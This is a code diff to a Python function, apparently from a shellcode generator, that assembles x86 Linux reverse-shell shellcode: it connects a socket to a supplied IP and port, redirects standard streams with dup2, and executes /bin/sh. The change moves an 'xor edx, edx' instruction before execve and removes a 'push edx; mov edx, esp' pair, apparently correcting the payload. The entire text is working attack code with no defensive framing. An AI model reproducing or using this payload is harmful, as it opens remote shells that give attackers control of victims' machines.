@@ -56,7 +56,6 @@ def remote(arch, ipStr, portNum) :
         result = ("\x31\xc0"            + #xor    eax, eax
                   "\x31\xdb"            + #xor    ebx, ebx
                   "\x31\xc9"            + #xor    ecx, ecx
-                  "\x31\xd2"            + #xor    edx, dex
                   "\xb0\x66"            + #mov    al, 0x66
                   "\xb3\x01"            + #mov    bl, 0x1
                   "\x51"                + #push   ecx
@@ -86,14 +85,13 @@ def remote(arch, ipStr, portNum) :
                   "\xcd\x80"            + #int    0x80       │ // sys_dup2
                   "\x75\xf8"            + #jne    -8        ─┘
                   "\x31\xc0"            + #xor    eax, eax
+                  "\x31\xd2"            + #xor    edx, dex
                   "\x52"                + #push   edx
                   GetPushStrAsm('/bin/sh') + #push  /bin/sh
                   "\x89\xe3"            + #mov    ebx, esp
                   "\x52"                + #push   edx
                   "\x53"                + #push   ebx
                   "\x89\xe1"            + #mov    ecx, esp
-                  "\x52"                + #push   edx
-                  "\x89\xe2"            + #mov    edx, esp
                   "\xb0\x0b"            + #mov    al, 0xb
                   "\xcd\x80")             #int    0x80
         
